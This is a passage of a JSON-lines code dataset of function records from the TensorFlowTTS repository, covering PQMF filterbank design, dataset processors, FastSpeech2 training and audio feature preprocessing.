"repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Analysis with PQMF.\nArgs:\n    x (Tensor): Input tensor (B, T, 1).\nReturns:\n    Tensor: Output tensor (B, T // subbands, subbands).\n\"\"\"\n", "func_signal": "def analysis(self, x):\n", "code": "x = tf.pad(x, [[0, 0], [self.taps // 2, self.taps // 2], [0, 0]])\nx = tf.nn.conv1d(x, self.analysis_filter, stride=1, padding=\"VALID\")\nx = tf.nn.conv1d(x, self.updown_filter, stride=self.subbands, padding=\"VALID\")\nreturn x", "path": "TensorFlowTTS/tensorflow_tts/models/mb_melgan.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"\nMethod used to create items from training file\nitems struct example => text, wav_file_path, speaker_name.\nNote that the speaker_name should be a last.\n\"\"\"\n", "func_signal": "def create_items(self):\n", "code": "with open(\n    os.path.join(self.data_dir, self.train_f_name), mode=\"r\", encoding=\"utf-8\"\n) as f:\n    for line in f:\n        parts = line.strip().split(self.delimiter)\n        wav_path = os.path.join(self.data_dir, parts[self.positions[\"file\"]])\n        wav_path = (\n            wav_path + self.f_extension\n            if wav_path[-len(self.f_extension) :] != self.f_extension\n            else wav_path\n        )\n        text = parts[self.positions[\"text\"]]\n        speaker_name = parts[self.positions[\"speaker_name\"]]\n        self.items.append([text, wav_path, speaker_name])", "path": "TensorFlowTTS/tensorflow_tts/processor/base_processor.py", "commit_date": "2020-09-01 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Synthesis with PQMF.\nArgs:\n    x (Tensor): Input tensor (B, T // subbands, subbands).\nReturns:\n    Tensor: Output tensor (B, T, 1).\n\"\"\"\n", "func_signal": "def synthesis(self, x):\n", "code": "x = tf.nn.conv1d_transpose(\n    x,\n    self.updown_filter * self.subbands,\n    strides=self.subbands,\n    output_shape=(\n        tf.shape(x)[0],\n        tf.shape(x)[1] * self.subbands,\n        self.subbands,\n    ),\n)\nx = tf.pad(x, [[0, 0], [self.taps // 2, self.taps // 2], [0, 0]])\nreturn tf.nn.conv1d(x, self.synthesis_filter, stride=1, padding=\"VALID\")", "path": "TensorFlowTTS/tensorflow_tts/models/mb_melgan.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Generate and save intermediate result.\"\"\"\n", "func_signal": "def generate_and_save_intermediate_result(self, batch):\n", "code": "import matplotlib.pyplot as plt\n\n# predict with tf.function.\noutputs = self.one_step_predict(batch)\n\nmels_before, mels_after, *_ = outputs\nmel_gts = batch[\"mel_gts\"]\nutt_ids = batch[\"utt_ids\"]\n\n# convert to tensor.\n# here we just take a sample at first replica.\ntry:\n    mels_before = mels_before.values[0].numpy()\n    mels_after = mels_after.values[0].numpy()\n    mel_gts = mel_gts.values[0].numpy()\n    utt_ids = utt_ids.values[0].numpy()\nexcept Exception:\n    mels_before = mels_before.numpy()\n    mels_after = mels_after.numpy()\n    mel_gts = mel_gts.numpy()\n    utt_ids = utt_ids.numpy()\n\n# check directory\nif self.use_griffin:\n    griff_dir_name = os.path.join(\n        self.config[\"outdir\"], f\"predictions/{self.steps}_wav\"\n    )\n    if not os.path.exists(griff_dir_name):\n        os.makedirs(griff_dir_name)\n\ndirname = os.path.join(self.config[\"outdir\"], f\"predictions/{self.steps}steps\")\nif not os.path.exists(dirname):\n    os.makedirs(dirname)\n\nfor idx, (mel_gt, mel_before, mel_after) in enumerate(\n    zip(mel_gts, mels_before, mels_after), 0\n):\n\n    if self.use_griffin:\n        utt_id = utt_ids[idx]\n        grif_before = self.griffin_lim_tf(\n            tf.reshape(mel_before, [-1, 80])[tf.newaxis, :], n_iter=32\n        )\n        grif_after = self.griffin_lim_tf(\n            tf.reshape(mel_after, [-1, 80])[tf.newaxis, :], n_iter=32\n        )\n        grif_gt = self.griffin_lim_tf(\n            tf.reshape(mel_gt, [-1, 80])[tf.newaxis, :], n_iter=32\n        )\n        self.griffin_lim_tf.save_wav(\n            grif_before, griff_dir_name, f\"{utt_id}_before\"\n        )\n        self.griffin_lim_tf.save_wav(\n            grif_after, griff_dir_name, f\"{utt_id}_after\"\n        )\n        self.griffin_lim_tf.save_wav(grif_gt, griff_dir_name, f\"{utt_id}_gt\")\n\n    utt_id = utt_ids[idx]\n    mel_gt = tf.reshape(mel_gt, (-1, 80)).numpy()  # [length, 80]\n    mel_before = tf.reshape(mel_before, (-1, 80)).numpy()  # [length, 80]\n    mel_after = tf.reshape(mel_after, (-1, 80)).numpy()  # [length, 80]\n\n    # plit figure and save it\n    figname = os.path.join(dirname, f\"{utt_id}.png\")\n    fig = plt.figure(figsize=(10, 8))\n    ax1 = fig.add_subplot(311)\n    ax2 = fig.add_subplot(312)\n    ax3 = fig.add_subplot(313)\n    im = ax1.imshow(np.rot90(mel_gt), aspect=\"auto\", interpolation=\"none\")\n    ax1.set_title(\"Target Mel-Spectrogram\")\n    fig.colorbar(mappable=im, shrink=0.65, orientation=\"horizontal\", ax=ax1)\n    ax2.set_title(\"Predicted Mel-before-Spectrogram\")\n    im = ax2.imshow(np.rot90(mel_before), aspect=\"auto\", interpolation=\"none\")\n    fig.colorbar(mappable=im, shrink=0.65, orientation=\"horizontal\", ax=ax2)\n    ax3.set_title(\"Predicted Mel-after-Spectrogram\")\n    im = ax3.imshow(np.rot90(mel_after), aspect=\"auto\", interpolation=\"none\")\n    fig.colorbar(mappable=im, shrink=0.65, orientation=\"horizontal\", ax=ax3)\n    plt.tight_layout()\n    plt.savefig(figname)\n    plt.close()", "path": "TensorFlowTTS/examples/fastspeech2_libritts/train_fastspeech2.py", "commit_date": "2020-11-19 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Check if value is an outlier.\"\"\"\n", "func_signal": "def is_outlier(x, p25, p75):\n", "code": "lower = p25 - 1.5 * (p75 - p25)\nupper = p75 + 1.5 * (p75 - p25)\nreturn x <= lower or x >= upper", "path": "TensorFlowTTS/tensorflow_tts/utils/outliers.py", "commit_date": "2020-09-10 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Run training process.\"\"\"\n", "func_signal": "def main():\n", "code": "parser = argparse.ArgumentParser(\n    description=\"Train FastSpeech (See detail in tensorflow_tts/bin/train-fastspeech.py)\"\n)\nparser.add_argument(\n    \"--train-dir\",\n    default=\"dump/train\",\n    type=str,\n    help=\"directory including training data. \",\n)\nparser.add_argument(\n    \"--dev-dir\",\n    default=\"dump/valid\",\n    type=str,\n    help=\"directory including development data. \",\n)\nparser.add_argument(\n    \"--use-norm\", default=1, type=int, help=\"usr norm-mels for train or raw.\"\n)\nparser.add_argument(\n    \"--f0-stat\", default=\"./dump/stats_f0.npy\", type=str, help=\"f0-stat path.\",\n)\nparser.add_argument(\n    \"--energy-stat\",\n    default=\"./dump/stats_energy.npy\",\n    type=str,\n    help=\"energy-stat path.\",\n)\nparser.add_argument(\n    \"--outdir\", type=str, required=True, help=\"directory to save checkpoints.\"\n)\nparser.add_argument(\n    \"--config\", type=str, required=True, help=\"yaml format configuration file.\"\n)\nparser.add_argument(\n    \"--resume\",\n    default=\"\",\n    type=str,\n    nargs=\"?\",\n    help='checkpoint file path to resume training. (default=\"\")',\n)\nparser.add_argument(\n    \"--verbose\",\n    type=int,\n    default=1,\n    help=\"logging level. higher is more logging. (default=1)\",\n)\nparser.add_argument(\n    \"--mixed_precision\",\n    default=1,\n    type=int,\n    help=\"using mixed precision for generator or not.\",\n)\nparser.add_argument(\n    \"--dataset_config\", default=\"preprocess/libritts_preprocess.yaml\", type=str,\n)\nparser.add_argument(\n    \"--dataset_stats\", default=\"dump/stats.npy\", type=str,\n)\nparser.add_argument(\n    \"--dataset_mapping\", default=\"dump/libritts_mapper.npy\", type=str,\n)\nparser.add_argument(\n    \"--pretrained\",\n    default=\"\",\n    type=str,\n    nargs=\"?\",\n    help=\"pretrained weights .h5 file to load weights from. Auto-skips non-matching layers\",\n)\nargs = parser.parse_args()\n\n# return strategy\nSTRATEGY = return_strategy()\n\n# set mixed precision config\nif args.mixed_precision == 1:\n    tf.config.optimizer.set_experimental_options({\"auto_mixed_precision\": True})\n\nargs.mixed_precision = bool(args.mixed_precision)\nargs.use_norm = bool(args.use_norm)\n\n# set logger\nif args.verbose > 1:\n    logging.basicConfig(\n        level=logging.DEBUG,\n        stream=sys.stdout,\n        format=\"%(asctime)s (%(module)s:%(lineno)d) %(levelname)s: %(message)s\",\n    )\nelif args.verbose > 0:\n    logging.basicConfig(\n        level=logging.INFO,\n        stream=sys.stdout,\n        format=\"%(asctime)s (%(module)s:%(lineno)d) %(levelname)s: %(message)s\",\n    )\nelse:\n    logging.basicConfig(\n        level=logging.WARN,\n        stream=sys.stdout,\n        format=\"%(asctime)s (%(module)s:%(lineno)d) %(levelname)s: %(message)s\",\n    )\n    logging.warning(\"Skip DEBUG/INFO messages\")\n\n# check directory existence\nif not os.path.exists(args.outdir):\n    os.makedirs(args.outdir)\n\n# check arguments\nif args.train_dir is None:\n    raise ValueError(\"Please specify --train-dir\")\nif args.dev_dir is None:\n    raise ValueError(\"Please specify --valid-dir\")\n\n# load and save config\nwith open(args.config) as f:\n    config = yaml.load(f, Loader=yaml.Loader)\nconfig.update(vars(args))\nconfig[\"version\"] = tensorflow_tts.__version__\nwith open(os.path.join(args.outdir, \"config.yml\"), \"w\") as f:\n    yaml.dump(config, f, Dumper=yaml.Dumper)\nfor key, value in config.items():\n    logging.info(f\"{key} = {value}\")\n\n# get dataset\nif config[\"remove_short_samples\"]:\n    mel_length_threshold = config[\"mel_length_threshold\"]\nelse:\n    mel_length_threshold = None\n\nif config[\"format\"] == \"npy\":\n    charactor_query = \"*-ids.npy\"\n    mel_query = \"*-raw-feats.npy\" if args.use_norm is False else \"*-norm-feats.npy\"\n    duration_query = \"*-durations.npy\"\n    f0_query = \"*-raw-f0.npy\"\n    energy_query = \"*-raw-energy.npy\"\nelse:\n    raise ValueError(\"Only npy are supported.\")\n\n# load speakers map from dataset map\nwith open(args.dataset_mapping) as f:\n    dataset_mapping = json.load(f)\n    speakers_map = dataset_mapping[\"speakers_map\"]\n\n# Check n_speakers matches number of speakers in speakers_map\nn_speakers = config[\"fastspeech2_params\"][\"n_speakers\"]\nassert n_speakers == len(\n    speakers_map\n), f\"Number of speakers in dataset does not match n_speakers in config\"\n\n# define train/valid dataset\ntrain_dataset = CharactorDurationF0EnergyMelDataset(\n    root_dir=args.train_dir,\n    charactor_query=charactor_query,\n    mel_query=mel_query,\n    duration_query=duration_query,\n    f0_query=f0_query,\n    energy_query=energy_query,\n    f0_stat=args.f0_stat,\n    energy_stat=args.energy_stat,\n    mel_length_threshold=mel_length_threshold,\n    speakers_map=speakers_map,\n).create(\n    is_shuffle=config[\"is_shuffle\"],\n    allow_cache=config[\"allow_cache\"],\n    batch_size=config[\"batch_size\"]\n    * STRATEGY.num_replicas_in_sync\n    * config[\"gradient_accumulation_steps\"],\n)\n\nvalid_dataset = CharactorDurationF0EnergyMelDataset(\n    root_dir=args.dev_dir,\n    charactor_query=charactor_query,\n    mel_query=mel_query,\n    duration_query=duration_query,\n    f0_query=f0_query,\n    energy_query=energy_query,\n    f0_stat=args.f0_stat,\n    energy_stat=args.energy_stat,\n    mel_length_threshold=mel_length_threshold,\n    speakers_map=speakers_map,\n).create(\n    is_shuffle=config[\"is_shuffle\"],\n    allow_cache=config[\"allow_cache\"],\n    batch_size=config[\"batch_size\"] * STRATEGY.num_replicas_in_sync,\n)\n\n# define trainer\ntrainer = FastSpeech2Trainer(\n    config=config,\n    strategy=STRATEGY,\n    steps=0,\n    epochs=0,\n    is_mixed_precision=args.mixed_precision,\n    stats_path=args.dataset_stats,\n    dataset_config=args.dataset_config,\n)\n\nwith STRATEGY.scope():\n    # define model\n    fastspeech = TFFastSpeech2(\n        config=FastSpeech2Config(**config[\"fastspeech2_params\"])\n    )\n    fastspeech._build()\n    fastspeech.summary()\n\n    if len(args.pretrained) > 1:\n        fastspeech.load_weights(args.pretrained, by_name=True, skip_mismatch=True)\n        logging.info(\n            f\"Successfully loaded pretrained weight from {args.pretrained}.\"\n        )\n\n    # AdamW for fastspeech\n    learning_rate_fn = tf.keras.optimizers.schedules.PolynomialDecay(\n        initial_learning_rate=config[\"optimizer_params\"][\"initial_learning_rate\"],\n        decay_steps=config[\"optimizer_params\"][\"decay_steps\"],\n        end_learning_rate=config[\"optimizer_params\"][\"end_learning_rate\"],\n    )\n\n    learning_rate_fn = WarmUp(\n        initial_learning_rate=config[\"optimizer_params\"][\"initial_learning_rate\"],\n        decay_schedule_fn=learning_rate_fn,\n        warmup_steps=int(\n            config[\"train_max_steps\"]\n            * config[\"optimizer_params\"][\"warmup_proportion\"]\n        ),\n    )\n\n    optimizer = AdamWeightDecay(\n        learning_rate=learning_rate_fn,\n        weight_decay_rate=config[\"optimizer_params\"][\"weight_decay\"],\n        beta_1=0.9,\n        beta_2=0.98,\n        epsilon=1e-6,\n        exclude_from_weight_decay=[\"LayerNorm\", \"layer_norm\", \"bias\"],\n    )\n\n    _ = optimizer.iterations\n\n# compile trainer\ntrainer.compile(model=fastspeech, optimizer=optimizer)\n\n# start training\ntry:\n    trainer.fit(\n        train_dataset,\n        valid_dataset,\n        saved_path=os.path.join(config[\"outdir\"], \"checkpoints/\"),\n        resume=args.resume,\n    )\nexcept KeyboardInterrupt:\n    trainer.save_checkpoint()\n    logging.info(f\"Successfully saved checkpoint @ {trainer.steps}steps.\")", "path": "TensorFlowTTS/examples/fastspeech2_libritts/train_fastspeech2.py", "commit_date": "2020-11-19 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Design prototype filter for PQMF.\nThis method is based on `A Kaiser window approach for the design of prototype\nfilters of cosine modulated filterbanks`_.\nArgs:\n    taps (int): The number of filter taps.\n    cutoff_ratio (float): Cut-off frequency ratio.\n    beta (float): Beta coefficient for kaiser window.\nReturns:\n    ndarray: Impluse response of prototype filter (taps + 1,).\n.. _`A Kaiser window approach for the design of prototype filters of cosine modulated filterbanks`:\n    https://ieeexplore.ieee.org/abstract/document/681427\n\"\"\"\n# check the arguments are valid\n", "func_signal": "def design_prototype_filter(taps=62, cutoff_ratio=0.15, beta=9.0):\n", "code": "assert taps % 2 == 0, \"The number of taps mush be even number.\"\nassert 0.0 < cutoff_ratio < 1.0, \"Cutoff ratio must be > 0.0 and < 1.0.\"\n\n# make initial filter\nomega_c = np.pi * cutoff_ratio\nwith np.errstate(invalid=\"ignore\"):\n    h_i = np.sin(omega_c * (np.arange(taps + 1) - 0.5 * taps)) / (\n        np.pi * (np.arange(taps + 1) - 0.5 * taps)\n    )\n# fix nan due to indeterminate form\nh_i[taps // 2] = np.cos(0) * cutoff_ratio\n\n# apply kaiser window\nw = kaiser(taps + 1, beta)\nh = h_i * w\n\nreturn h", "path": "TensorFlowTTS/tensorflow_tts/models/mb_melgan.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Save transformed dataset features in disk.\nArgs:\n    features (Dict): dictionary containing the attributes to save.\n    subdir (str): data split folder where features will be saved.\n    config (Dict): configuration dictionary.\n\"\"\"\n", "func_signal": "def save_features_to_file(features, subdir, config):\n", "code": "utt_id = features[\"utt_id\"]\n\nif config[\"format\"] == \"npy\":\n    save_list = [\n        (features[\"audio\"], \"wavs\", \"wave\", np.float32),\n        (features[\"mel\"], \"raw-feats\", \"raw-feats\", np.float32),\n        (features[\"text_ids\"], \"ids\", \"ids\", np.int32),\n        (features[\"f0\"], \"raw-f0\", \"raw-f0\", np.float32),\n        (features[\"energy\"], \"raw-energies\", \"raw-energy\", np.float32),\n    ]\n    for item, name_dir, name_file, fmt in save_list:\n        np.save(\n            os.path.join(\n                config[\"outdir\"], subdir, name_dir, f\"{utt_id}-{name_file}.npy\"\n            ),\n            item.astype(fmt),\n            allow_pickle=False,\n        )\nelse:\n    raise ValueError(\"'npy' is the only supported format.\")", "path": "TensorFlowTTS/tensorflow_tts/bin/preprocess.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Get one sample from dataset items.\nArgs:\n    item: one item in Dataset items.\n        Dataset items may include (raw_text, speaker_id, wav_path, ...)\n\nReturns:\n    sample (dict): sample dictionary return all feature used for preprocessing later.\n\"\"\"\n", "func_signal": "def get_one_sample(self, item):\n", "code": "sample = {\n    \"raw_text\": None,\n    \"text_ids\": None,\n    \"audio\": None,\n    \"utt_id\": None,\n    \"speaker_name\": None,\n    \"rate\": None,\n}\nreturn sample", "path": "TensorFlowTTS/tensorflow_tts/processor/base_processor.py", "commit_date": "2020-09-01 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"\nCreate speaker map for dataset.\n\"\"\"\n", "func_signal": "def create_speaker_map(self):\n", "code": "sp_id = 0\nfor i in self.items:\n    speaker_name = i[-1]\n    if speaker_name not in self.speakers_map:\n        self.speakers_map[speaker_name] = sp_id\n        sp_id += 1", "path": "TensorFlowTTS/tensorflow_tts/processor/base_processor.py", "commit_date": "2020-09-01 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Initilize PQMF module.\nArgs:\n    config (class): MultiBandMelGANGeneratorConfig\n\"\"\"\n", "func_signal": "def __init__(self, config, **kwargs):\n", "code": "super().__init__(**kwargs)\nsubbands = config.subbands\ntaps = config.taps\ncutoff_ratio = config.cutoff_ratio\nbeta = config.beta\n\n# define filter coefficient\nh_proto = design_prototype_filter(taps, cutoff_ratio, beta)\nh_analysis = np.zeros((subbands, len(h_proto)))\nh_synthesis = np.zeros((subbands, len(h_proto)))\nfor k in range(subbands):\n    h_analysis[k] = (\n        2\n        * h_proto\n        * np.cos(\n            (2 * k + 1)\n            * (np.pi / (2 * subbands))\n            * (np.arange(taps + 1) - (taps / 2))\n            + (-1) ** k * np.pi / 4\n        )\n    )\n    h_synthesis[k] = (\n        2\n        * h_proto\n        * np.cos(\n            (2 * k + 1)\n            * (np.pi / (2 * subbands))\n            * (np.arange(taps + 1) - (taps / 2))\n            - (-1) ** k * np.pi / 4\n        )\n    )\n\n# [subbands, 1, taps + 1] == [filter_width, in_channels, out_channels]\nanalysis_filter = np.expand_dims(h_analysis, 1)\nanalysis_filter = np.transpose(analysis_filter, (2, 1, 0))\n\nsynthesis_filter = np.expand_dims(h_synthesis, 0)\nsynthesis_filter = np.transpose(synthesis_filter, (2, 1, 0))\n\n# filter for downsampling & upsampling\nupdown_filter = np.zeros((subbands, subbands, subbands), dtype=np.float32)\nfor k in range(subbands):\n    updown_filter[0, k, k] = 1.0\n\nself.subbands = subbands\nself.taps = taps\nself.analysis_filter = analysis_filter.astype(np.float32)\nself.synthesis_filter = synthesis_filter.astype(np.float32)\nself.updown_filter = updown_filter.astype(np.float32)", "path": "TensorFlowTTS/tensorflow_tts/models/mb_melgan.py", "commit_date": "2020-11-18 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Generate audio features and transformations\nArgs:\n    item (Dict): dictionary containing the attributes to encode.\n    config (Dict): configuration dictionary.\nReturns:\n    (bool): keep this sample or not.\n    mel (ndarray): mel matrix in np.float32.\n    energy (ndarray): energy audio profile.\n    f0 (ndarray): fundamental frequency.\n    item (Dict): dictionary containing the updated attributes.\n\"\"\"\n# get info from sample.\n", "func_signal": "def gen_audio_features(item, config):\n", "code": "audio = item[\"audio\"]\nutt_id = item[\"utt_id\"]\nrate = item[\"rate\"]\n\n# check audio properties\nassert len(audio.shape) == 1, f\"{utt_id} seems to be multi-channel signal.\"\nassert np.abs(audio).max() <= 1.0, f\"{utt_id} is different from 16 bit PCM.\"\n\n# check sample rate\nif rate != config[\"sampling_rate\"]:\n    audio = librosa.resample(audio, rate, config[\"sampling_rate\"])\n    logging.info(f\"{utt_id} sampling rate is {rate}, not {config['sampling_rate']}, we resample it.\")\n\n# trim silence\nif config[\"trim_silence\"]:\n    if \"trim_mfa\" in config and config[\"trim_mfa\"]:\n        _, item[\"text_ids\"], audio = ph_based_trim(\n            config,\n            utt_id,\n            item[\"text_ids\"],\n            item[\"raw_text\"],\n            audio,\n            config[\"hop_size\"],\n        )\n        if (\n            audio.__len__() < 1\n        ):  # very short files can get trimmed fully if mfa didnt extract any tokens LibriTTS maybe take only longer files?\n            logging.warning(\n                f\"File have only silence or MFA didnt extract any token {utt_id}\"\n            )\n            return False, None, None, None, item\n    else:\n        audio, _ = librosa.effects.trim(\n            audio,\n            top_db=config[\"trim_threshold_in_db\"],\n            frame_length=config[\"trim_frame_size\"],\n            hop_length=config[\"trim_hop_size\"],\n        )\n\n# resample audio if necessary\nif \"sampling_rate_for_feats\" in config:\n    audio = librosa.resample(audio, rate, config[\"sampling_rate_for_feats\"])\n    sampling_rate = config[\"sampling_rate_for_feats\"]\n    assert (\n        config[\"hop_size\"] * config[\"sampling_rate_for_feats\"] % rate == 0\n    ), \"'hop_size' must be 'int' value. Please check if 'sampling_rate_for_feats' is correct.\"\n    hop_size = config[\"hop_size\"] * config[\"sampling_rate_for_feats\"] // rate\nelse:\n    sampling_rate = config[\"sampling_rate\"]\n    hop_size = config[\"hop_size\"]\n\n# get spectrogram\nD = librosa.stft(\n    audio,\n    n_fft=config[\"fft_size\"],\n    hop_length=hop_size,\n    win_length=config[\"win_length\"],\n    window=config[\"window\"],\n    pad_mode=\"reflect\",\n)\nS, _ = librosa.magphase(D)  # (#bins, #frames)\n\n# get mel basis\nfmin = 0 if config[\"fmin\"] is None else config[\"fmin\"]\nfmax = sampling_rate // 2 if config[\"fmax\"] is None else config[\"fmax\"]\nmel_basis = librosa.filters.mel(\n    sr=sampling_rate,\n    n_fft=config[\"fft_size\"],\n    n_mels=config[\"num_mels\"],\n    fmin=fmin,\n    fmax=fmax,\n)\nmel = np.log10(np.maximum(np.dot(mel_basis, S), 1e-10)).T  # (#frames, #bins)\n\n# check audio and feature length\naudio = np.pad(audio, (0, config[\"fft_size\"]), mode=\"edge\")\naudio = audio[: len(mel) * hop_size]\nassert len(mel) * hop_size == len(audio)\n\n# extract raw pitch\n_f0, t = pw.dio(\n    audio.astype(np.double),\n    fs=sampling_rate,\n    f0_ceil=fmax,\n    frame_period=1000 * hop_size / sampling_rate,\n)\nf0 = pw.stonemask(audio.astype(np.double), _f0, t, sampling_rate)\nif len(f0) >= len(mel):\n    f0 = f0[: len(mel)]\nelse:\n    f0 = np.pad(f0, (0, len(mel) - len(f0)))\n\n# extract energy\nenergy = np.sqrt(np.sum(S ** 2, axis=0))\nassert len(mel) == len(f0) == len(energy)\n\n# remove outlier f0/energy\nf0 = remove_outlier(f0)\nenergy = remove_outlier(energy)\n\n# apply global gain\nif config[\"global_gain_scale\"] > 0.0:\n    audio *= config[\"global_gain_scale\"]\nif np.abs(audio).max() >= 1.0:\n    logging.warn(\n        f\"{utt_id} causes clipping. It is better to reconsider global gain scale value.\"\n    )\nitem[\"audio\"] = audio\nitem[\"mel\"] = mel\nitem[\"f0\"] = f0\nitem[\"energy\"] = energy\nreturn True, mel, energy, f0, item", "path": "TensorFlowTTS/tensorflow_tts/bin/preprocess.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
{"docstring": "\"\"\"Run preprocessing process and compute statistics for normalizing.\"\"\"\n", "func_signal": "def preprocess():\n", "code": "config = parse_and_config()\n\ndataset_processor = {\n    \"ljspeech\": LJSpeechProcessor,\n    \"kss\": KSSProcessor,\n    \"libritts\": LibriTTSProcessor,\n    \"baker\": BakerProcessor,\n    \"thorsten\": ThorstenProcessor,\n}\n\ndataset_symbol = {\n    \"ljspeech\": LJSPEECH_SYMBOLS,\n    \"kss\": KSS_SYMBOLS,\n    \"libritts\": LIBRITTS_SYMBOLS,\n    \"baker\": BAKER_SYMBOLS,\n    \"thorsten\": THORSTEN_SYMBOLS,\n}\n\ndataset_cleaner = {\n    \"ljspeech\": \"english_cleaners\",\n    \"kss\": \"korean_cleaners\",\n    \"libritts\": None,\n    \"baker\": None,\n    \"thorsten\": \"german_cleaners\",\n}\n\nlogging.info(f\"Selected '{config['dataset']}' processor.\")\nprocessor = dataset_processor[config[\"dataset\"]](\n    config[\"rootdir\"],\n    symbols=dataset_symbol[config[\"dataset\"]],\n    cleaner_names=dataset_cleaner[config[\"dataset\"]],\n)\n\n# check output directories\nbuild_dir = lambda x: [\n    os.makedirs(os.path.join(config[\"outdir\"], x, y), exist_ok=True)\n    for y in [\"raw-feats\", \"wavs\", \"ids\", \"raw-f0\", \"raw-energies\"]\n]\nbuild_dir(\"train\")\nbuild_dir(\"valid\")\n\n# save pretrained-processor to feature dir\nprocessor._save_mapper(\n    os.path.join(config[\"outdir\"], f\"{config['dataset']}_mapper.json\"),\n    extra_attrs_to_save={\"pinyin_dict\": processor.pinyin_dict}\n    if config[\"dataset\"] == \"baker\"\n    else {},\n)\n\n# build train test split\nif config[\"dataset\"] == \"libritts\":\n    train_split, valid_split, _, _ = train_test_split(\n        processor.items,\n        [i[-1] for i in processor.items],\n        test_size=config[\"test_size\"],\n        random_state=42,\n        shuffle=True,\n    )\nelse:\n    train_split, valid_split = train_test_split(\n        processor.items,\n        test_size=config[\"test_size\"],\n        random_state=42,\n        shuffle=True,\n    )\nlogging.info(f\"Training items: {len(train_split)}\")\nlogging.info(f\"Validation items: {len(valid_split)}\")\n\nget_utt_id = lambda x: os.path.split(x[1])[-1].split(\".\")[0]\ntrain_utt_ids = [get_utt_id(x) for x in train_split]\nvalid_utt_ids = [get_utt_id(x) for x in valid_split]\n\n# save train and valid utt_ids to track later\nnp.save(os.path.join(config[\"outdir\"], \"train_utt_ids.npy\"), train_utt_ids)\nnp.save(os.path.join(config[\"outdir\"], \"valid_utt_ids.npy\"), valid_utt_ids)\n\n# define map iterator\ndef iterator_data(items_list):\n    for item in items_list:\n        yield processor.get_one_sample(item)\n\ntrain_iterator_data = iterator_data(train_split)\nvalid_iterator_data = iterator_data(valid_split)\n\np = Pool(config[\"n_cpus\"])\n\n# preprocess train files and get statistics for normalizing\npartial_fn = partial(gen_audio_features, config=config)\ntrain_map = p.imap_unordered(\n    partial_fn,\n    tqdm(train_iterator_data, total=len(train_split), desc=\"[Preprocessing train]\"),\n    chunksize=10,\n)\n# init scaler for multiple features\nscaler_mel = StandardScaler(copy=False)\nscaler_energy = StandardScaler(copy=False)\nscaler_f0 = StandardScaler(copy=False)\n\nid_to_remove = []\nfor result, mel, energy, f0, features in train_map:\n    if not result:\n        id_to_remove.append(features[\"utt_id\"])\n        continue\n    save_features_to_file(features, \"train\", config)\n    # partial fitting of scalers\n    if len(energy[energy != 0]) == 0 or len(f0[f0 != 0]) == 0:\n        id_to_remove.append(features[\"utt_id\"])\n        continue\n    # partial fitting of scalers\n    if len(energy[energy != 0]) == 0 or len(f0[f0 != 0]) == 0:\n        id_to_remove.append(features[\"utt_id\"])\n        continue\n    scaler_mel.partial_fit(mel)\n    scaler_energy.partial_fit(energy[energy != 0].reshape(-1, 1))\n    scaler_f0.partial_fit(f0[f0 != 0].reshape(-1, 1))\n\nif len(id_to_remove) > 0:\n    np.save(\n        os.path.join(config[\"outdir\"], \"train_utt_ids.npy\"),\n        [i for i in train_utt_ids if i not in id_to_remove],\n    )\n    logging.info(\n        f\"removed {len(id_to_remove)} cause of too many outliers or bad mfa extraction\"\n    )\n\n# save statistics to file\nlogging.info(\"Saving computed statistics.\")\nscaler_list = [(scaler_mel, \"\"), (scaler_energy, \"_energy\"), (scaler_f0, \"_f0\")]\nsave_statistics_to_file(scaler_list, config)\n\n# preprocess valid files\npartial_fn = partial(gen_audio_features, config=config)\nvalid_map = p.imap_unordered(\n    partial_fn,\n    tqdm(valid_iterator_data, total=len(valid_split), desc=\"[Preprocessing valid]\"),\n    chunksize=10,\n)\nfor *_, features in valid_map:\n    save_features_to_file(features, \"valid\", config)", "path": "TensorFlowTTS/tensorflow_tts/bin/preprocess.py", "commit_date": "2020-12-02 00:00:00", "repo_name": "TensorSpeech/TensorFlowTTS", "stars": 3662, "license": "apache-2.0", "language": "python", "size": 136523}
